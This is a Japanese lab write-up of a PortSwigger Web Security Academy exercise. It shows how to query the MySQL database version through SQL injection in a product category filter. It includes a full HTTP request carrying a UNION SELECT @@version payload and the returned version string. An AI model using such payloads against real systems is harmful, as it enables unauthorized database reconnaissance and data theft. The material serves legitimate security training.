# SQL インジェクション攻撃、MySQL および Microsoft 上のデータベースの種類とバージョンをクエリする

次のハッキングラボを実施します  
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft  
このラボには、製品カテゴリ フィルターに SQL インジェクションの脆弱性が含まれています。UNION 攻撃を使用して、挿入されたクエリから結果を取得できます。

- 1. BurpSuite を起動し、Proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. 製品のフィルタリングを行います
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/183a1509-220a-42c8-9359-0bbd5802afb3)
- 4. GET /filter?category=XXX リクエストを send to repeater します
- 5. リクエストを次のように変更するとデータベースのバージョンが取得できます

```
GET /filter?category=Gifts'+UNION+SELECT+@@version,+1# HTTP/2
Host: 0ae5008d0349238482ad16f400ae00a8.web-security-academy.net
Cookie: session=rnM4reag1q0jr6w2qgRap8pRdOZdF1L8
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae5008d0349238482ad16f400ae00a8.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
```

レスポンス抜粋

```
8.0.34-0ubuntu0.20.04.1
```
